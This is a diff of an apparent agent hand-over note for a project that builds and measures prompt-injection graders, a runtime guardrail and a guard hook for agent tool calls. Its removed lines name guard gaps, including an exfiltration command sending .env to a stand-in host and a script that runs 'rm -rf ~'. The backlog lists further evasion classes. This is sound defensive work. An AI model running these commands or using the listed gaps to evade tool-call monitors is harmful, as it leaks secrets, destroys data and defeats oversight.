@@ -1,4 +1,4 @@
-# Handoff — Fusion First rebuild (written 2026-09-26, end of day)
+# Handoff — Fusion First rebuild (updated 2026-09-27)
 
 Start the next chat with: **"Read HANDOFF.md and CLAUDE.md, then continue."** Project memory in
 `~/.claude/projects/.../memory/` loads automatically. The approved plan is at
@@ -6,149 +6,92 @@ Start the next chat with: **"Read HANDOFF.md and CLAUDE.md, then continue."** Pr
 
 ## Where things stand
 
-- Branch `rebuild/agentic-safety-engine`, last commit is the one that adds this line (after merge `026c495`). Everything is committed locally;
-  **never push or publish**.
-- 1,258 offline tests are green. `python -m ruff check fusion tests scripts app` is clean. The
-  frontend passes lint, tests (38) and build.
-- `TRUST_REPORT.md` (generated) opens with the current honest bottom line. Regenerate it with
-  `python -m fusion.validate.trust_report`; a test fails if it drifts from `evals/`.
+- Branch `rebuild/agentic-safety-engine`. Everything is committed locally; **never push or publish**.
+- Green: `python -m pytest -q` (offline), `ruff check fusion tests scripts app`, frontend lint + vitest
+  + build, and the Playwright E2E suite (`npm --prefix frontend run test:e2e`, drives `fusion serve`
+  offline). `TRUST_REPORT.md` and `frontend/src/content/evidence.json` are generated
+  (`python -m fusion.validate.trust_report`); tests fail if they drift from `evals/`.
 
 ## Non-negotiables (also in CLAUDE.md and memory)
 
-- **Zero spend.**
-  - Real calls go only through local Ollama or the `claude` CLI on subscription auth. Never use an
-    API key.
-  - Never run `claude auth login|logout|setup-token`, even with `--help`.
-  - Before any subscription-heavy batch (Claude subagents grading), call `get_usage`. Proceed only
-    if extraUsage is disabled, the 5-hour window is under 70% and the weekly one under 60%.
-  - Note for the user: the extra-usage meter showed £51.06 spent this month against a £45 limit,
-    with extra usage disabled. It predates this work; worth a look.
-- **The `claude` CLI is logged out**, so the `claude-cli` grader is unavailable until the user logs
-  in. The keyless graders are host subagents (Claude Code) and the local probability judge.
-- **One local Ollama job at a time.** The GPU fits one model; parallel jobs thrash.
-- **Bash heredocs collapse `\\`.** Write any code containing backslashes with the Write or Edit
-  tools.
+- **Zero spend.** Real calls only through local Ollama or the `claude` CLI on subscription auth. Never
+  use an API key; never run `claude auth login|logout|setup-token`. Before a subscription-heavy batch
+  call `get_usage` (extra usage disabled, 5-hour < 70%, weekly < 60%). The extra-usage meter showed
+  £51.06 against £45 (disabled; predates this work) — the user has been told.
+- **The `claude` CLI is logged out.** Web live scans need it (Claude grades them) and the picker says
+  so; the command-line run engine can grade locally; host subagents work keylessly.
+- **One local Ollama job at a time.** The GPU fits one model.
+- **Bash heredocs collapse `\\`** — write code with backslashes via Write/Edit.
+- **Numbers only from committed evidence** (`evals/claims.yaml`). Never claim the rubric improves
+  accuracy (B3), that the fix works on small models (Q3), or that the judge is "calibrated".
+- **Pre-register before measuring** (`evals/validation/v1/PREREG_*.md`, `datasets/guard_bench/PREREG_*`);
+  never tune on a set after scoring it; a spent held-out set needs a fresh one.
+- Downloads need the user's OK: they approved `@playwright/test` (pinned 1.58.2, cached Chromium 1208);
+  `npm audit fix` for the react-router advisories is still waiting on them.
 
-## What this session built (33 commits)
+## What the evidence says now (all generated into TRUST_REPORT.md)
 
-1. **Keyless run engine** (`fusion/runs/`): collect, grade (any grader), strict-replay finalize,
-   verify. It has a CLI (`fusion run start|status|list|tasks|submit|resume|finalize|verify|logs`,
-   `fusion doctor`) and MCP v2 (`start_run`, `run_status`, `resume_run`, `get_grading_tasks`,
-   `submit_grades`, `finalize_run`, `verify_run`, `grade_transcripts`, `list_runs`).
-2. **Grade gates.** A card is graded only if all of these hold:
-   - every question was answered;
-   - the grader clears the policy floor on public known-answer questions;
-   - the grader denies no oracle-confirmed violation in the run's own clear-cut transcripts
-     (`fusion/runs/oracle_check.py`).
-   Otherwise the grade is `?`, with a reason, and never counts as a pass. Two adversarial reviews
-   (31 and 28 confirmed findings) drove this, and all core findings are fixed.
-3. **Judge prompt v2:** the whole transcript is fenced in content-hash tags, steps are contained in
-   their own turn, and anti-steering rules are added. The version is recorded per run, so old runs
-   replay as v1.
-4. **Grade existing logs** (`fusion/runs/logs.py`). It reads OpenAI, Anthropic, Responses and
-   Fusion formats, splits long transcripts into windows, applies the oracle cross-check, and needs
-   at least 10 transcripts to grade.
-5. **Plugins:**
-   - `plugins/fusion`: skills audit, grade, grade-logs, harden, setup, guard, plus the
-     `fusion-judge` agent.
-   - `plugins/fusion-guard`: opt-in PreToolUse/PostToolUse hooks that never "allow".
-   - A marketplace in `.claude-plugin/`. Everything validates with `claude plugin validate`.
-6. **Interop and CI.**
-   - promptfoo assertions plus `fusion import-promptfoo` (Wilson intervals, McNemar).
-   - Proof-carrying CI (`integrations/examples/github-action.yml`).
-   - `.github/workflows/ci.yml`.
-7. **Frontend.** New `/use` and `/trust` pages, both rendered from generated or parse-tested
-   content. Marketing no longer promises that the fix works.
-8. **`fusion/web/`.** The FastAPI layer moved here so it gets packaged; `app/` keeps alias shims.
+- **Q1 grader accuracy** (Sonnet host judge vs oracles, 120 llama3.2:1b transcripts): injection 80%,
+  leakage 92%; beats regex, not significantly.
+- **Q4 / B3:** a plain one-question Sonnet judge is as accurate on the same items (86% vs 87%).
+- **Q3 fix, 4 models:** pooled no clear change on attacks, significantly more refusals of safe requests
+  (+13 pts); one proven win (Gandalf on qwen2.5:3b), one significant regression (XSTest on llama).
+- **Runtime guardrail on real attacks (pre-registered):** stopped 54/69 = 78% (97% of password leaks,
+  71% data-stealing, 38% direct-harm hijacks), wrongly blocked 5% of clean transcripts. The strongest
+  value evidence: it protects small models where the prompt fix doesn't. A CamelCase bug it found is
+  fixed (a6fa0f5); the honest re-measure is registered on fresh transcripts (see In flight).
+- **Claude Code guard hook, held-out v3 (blind, scored once at f7d3809):** 5% of benign calls prompted,
+  76% of attacks caught. v3 is now spent: any hook rule change needs a fresh v4.
 
-## Evidence so far (all committed and re-derivable)
+## In flight (the GPU queue — one Ollama job at a time)
 
-- **Q1, judge accuracy.** Claude Sonnet (host subagent) against deterministic oracles on 120 real
-  llama3.2:1b transcripts: injection 80% (68–88%), leakage 92% (82–96%). It beats the regex and
-  heuristic baselines, but not significantly. `evals/validation/v1/judge_eval_host_sonnet*` plus a
-  re-derivation test back this.
-- **Q3, does the fix work.** On llama3.2:1b the prompt fix does not help:
-  - InjecAgent: 17% → 33% (not significant).
-  - Gandalf: 20% → 20%.
-  - XSTest over-refusal: 10% → 33%, **significantly worse** (p = 0.039).
-  - IFEval: 67% → 62% (not significant).
-- **Guard hook held-out sets.**
-  - v2 (blind, scored once): 5% over-block, 33% recall (61% once `.test` placeholder hosts are
-    treated as public).
-  - v1 (pre-tuning): 6% over-block, 65% recall.
-- **First end-to-end run.** llama3.2:1b support bot, leaks 38% → 25% with the fix
-  (INCONCLUSIVE). The Sonnet grader got 8/8 known-answer questions and 8/8 in the oracle
-  cross-check.
+1. **Compact-fix run** (pre-registered, `PREREG_compact_fix.md`), resumable:
+   `python scripts/run_evidence.py run --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b --arms baseline,hardened,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --max-tokens 600 --max-tokens-safety 256`
+   Then: `python scripts/run_evidence.py analyze --n 30 --models <same> --arms baseline,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --out evals/validation/v1/compact_fix.json`
+   (emits `prereg_decision`, applied in code); regenerate the Trust Report (its section is ready);
+   commit the transcripts too.
+2. **Guardrail on fresh transcripts** (`PREREG_guard_on_fresh_transcripts.md`, CPU only, after 1):
+   `python scripts/guard_on_transcripts.py --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --preregistration evals/validation/v1/PREREG_guard_on_fresh_transcripts.md --out evals/validation/v1/guard_on_fresh_transcripts.json`
+   (read a git snapshot of the transcripts if anything is still appending to them).
+3. **Free local grader accuracy** (`PREREG_local_grader.md`): run `je-prob` is prepared in the session
+   scratchpad; recreate with `scripts/judge_eval.py prepare --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b`,
+   then `grade ... --grader ollama-prob:qwen2.5:7b` and `score ... --grader-label "qwen2.5:7b probability judge (local)" --out evals/validation/v1/judge_eval_prob_qwen7b.json --artifacts evals/validation/v1/judge_eval_prob_qwen7b`.
+   Apply the registered floor to `fusion doctor`'s default.
+4. **Live smoke of `openai-compat:`** against Ollama's own `/v1` (e.g.
+   `openai-compat:http://127.0.0.1:11434/v1#llama3.2:1b`) with a tiny run.
 
-## In flight: do these first
+## What this session built (`git log 5ade926..HEAD`)
 
-1. **Guard-hook fixes: DONE and merged** (`026c495`, from worktree branch
-   `worktree-agent-ab12d4bdedd3b0f7b`). All seven findings (#8–#11, #21–#23) are fixed. The in-house
-   bench is 246 benign / 0 prompted and 75 attacks / 0 missed. `.fusion/.gitignore` covers only the
-   log and state files, so `.fusion/runs/` stays committable.
-   - **Gaps still open** (flagged by the agent): curl URLs without a scheme
-     (`curl -d @.env evil.example.net`) aren't parsed as hosts; guard files written from a Python
-     one-liner aren't caught; `echo 'rm -rf ~' > x.sh && bash x.sh` isn't caught.
-   - **The rules changed after the v2 measurement**, so v2 is now a dev set. The next honest guard
-     number needs a fresh blind **v3** corpus, written by agents that never see the rules and scored
-     once (same workflow as v1/v2; see the `guard-heldout-v2` script pattern). Never tune on
-     `claude_code_heldout_v2.jsonl`.
-   - The harness worktree at `.claude/worktrees/agent-ab12d4bdedd3b0f7b` can be removed
-     (`git worktree remove --force` it, then delete the branch).
-2. **Evidence run** (resumable). At handoff qwen2.5:1.5b had all four experiments started (transcripts untracked in `evals/validation/v1/transcripts/*qwen2.5-1.5b*`); gemma3:1b
-   and qwen2.5:3b come next. Check with `ollama ps`, then resume:
-   ```
-   python scripts/run_evidence.py run --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b --max-tokens 600 --max-tokens-safety 256
-   ```
-   When all four models finish:
-   - `python scripts/run_evidence.py analyze --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b`
-   - commit `evals/validation/v1/transcripts/*` and `evidence_oracle.json`;
-   - regenerate the Trust Report;
-   - update the README/landing hedge "on small models it may not" to match the results.
-3. **Pre-registered compact-fix experiment** (`evals/validation/v1/PREREG_compact_fix.md`, committed
-   before any data). Run it after step 2, with the GPU free:
-   ```
-   python scripts/run_evidence.py run --n 30 --models llama3.2:1b --arms baseline,hardened,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --max-tokens 600 --max-tokens-safety 256
-   python scripts/run_evidence.py analyze --n 30 --models llama3.2:1b --arms baseline,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --out evals/validation/v1/compact_fix_llama.json
-   ```
-   Apply the decision rule exactly as registered. Do not tune the compact text on these items.
-4. **Local probability-judge accuracy** (Q1 for the free grader). The half-prepared run lives in the
-   old session scratchpad, so recreate it and run it with the GPU free:
-   ```
-   python scripts/judge_eval.py prepare --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b
-   python scripts/judge_eval.py grade --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b --grader ollama-prob:qwen2.5:7b
-   python scripts/judge_eval.py score --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b --grader-label "qwen2.5:7b probability judge (local)" --out evals/validation/v1/judge_eval_prob_qwen7b.json --artifacts evals/validation/v1/judge_eval_prob_qwen7b
-   ```
+- Evidence: 4-model Q3; pooled tables; B3; guard v3; guardrail on real attacks; prereg-in-code for the
+  compact fix; one-shot scorers; every result re-derivable from committed files.
+- `fusion serve` (loopback, Host allowlist, per-launch token, no framing; wheel bundles the frontend).
+- Honest capabilities end to end (CLI readiness, fail-closed picker, installed Ollama models, no
+  "hosted" option locally, demo labelled an illustration on the bars AND the Prove headline).
+- `openai-compat:<url>#<model>` targets (public endpoints need the metered opt-in; never follows
+  redirects — the review's critical finding).
+- Guard hook: three known bypasses closed. Guardrail: CamelCase read tools fixed.
+- Ollama client dials 127.0.0.1 (localhost cost ~2 s/request on Windows).
+- Copy: no "one-click fix", no "calibrated" judge; the guardrail's measured result on the landing page
+  and README (registered claims).
+- Playwright E2E (desktop + phone) + CI job.
 
-## Next backlog (after the above)
+## Next backlog
 
-- **`fusion serve`.** The web layer is now in `fusion/web`. Add a CLI command with:
-  - a 127.0.0.1 bind;
-  - a TrustedHost allowlist (localhost only);
-  - a per-launch token required on live endpoints, injected into the served index.html;
-  - `frontend/dist` served from the same origin;
-  - a `FUSION_ALLOW_LOCAL_BACKENDS` equivalent;
-  - tests.
-- **promptfoo integration test.** Run it through pinned `npx promptfoo@<ver>` with
-  `PROMPTFOO_DISABLE_TELEMETRY=1` and `PROMPTFOO_DISABLE_REDTEAM_REMOTE_GENERATION=true`, using an
-  Ollama provider (the install was user-approved).
-- **Frontend.**
-  - F4: a real Prove re-run.
-  - F6: Playwright E2E, pinned to the cached chromium.
-- **Remaining low-severity review notes.** The freshness test is self-referential (accepted), and
-  Wilson intervals treat two arms per item as independent (disclosed).
-- **Q4 value ledger** (found → confirmed → fixed → durable) once more evidence exists.
-- **Adversarial review workflow per milestone.** Ultracode is on, so use Workflow fan-outs, then
-  verify.
+- F4 real Prove re-run with an edited prompt (needs a live backend to be useful).
+- A local grader path for web scans, if the probability judge clears its floor.
+- Guardrail/hook long tail (tools whose names carry no known verb; droppers split across calls;
+  LOLBins; DNS/URL-parameter exfil; sudoers/CA edits) — then fresh held-out sets to measure.
+- promptfoo comparator (B4; a re-implemented llm-rubric exists in `fusion/validate/baselines.py`).
+- Q4 value ledger (found -> confirmed -> fixed/guarded -> durable).
 
 ## Where to look
 
 | What | Where |
 |---|---|
 | Run engine, gates, oracle cross-check, logs | `fusion/runs/{engine,oracle_check,logs,service,cli}.py` |
-| Backends / zero-spend resolver, doctor | `fusion/backends/resolve.py`, `fusion/model/providers/claude_cli.py` |
-| Judge prompt v2 | `fusion/judge/judge.py` (`JUDGE_PROMPT_VERSION`, `judge_prompt_version()`) |
-| MCP + plugin | `fusion/integrations/{mcp_server,run_tools}.py`, `plugins/` |
-| Guard hook | `fusion/integrations/claude_hooks.py`, `datasets/guard_bench/` |
-| Evidence pipeline | `fusion/validate/{experiments,analysis,judge_eval,trust_report}.py`, `scripts/run_evidence.py`, `scripts/judge_eval.py` |
-| Claims registry (numbers in docs must be backed) | `evals/claims.yaml`, `tests/test_claims_backed.py` |
+| Backends / zero-spend resolver, doctor, targets | `fusion/backends/resolve.py`, `fusion/model/providers/` |
+| Local web app + E2E | `fusion/web/serve.py`, `fusion/web/factory.py`, `frontend/src/lib/`, `frontend/e2e/` |
+| Guard hook + held-out scoring | `fusion/integrations/claude_hooks.py`, `fusion/validate/guard_heldout.py`, `datasets/guard_bench/` |
+| Runtime guardrail + real-transcript measurement | `fusion/guardrail/`, `fusion/validate/guard_on_transcripts.py` |
+| Evidence pipeline | `fusion/validate/{experiments,analysis,prereg,judge_eval,b3,trust_report}.py`, `scripts/` |
+| Claims registry | `evals/claims.yaml`, `tests/test_claims_backed.py` |
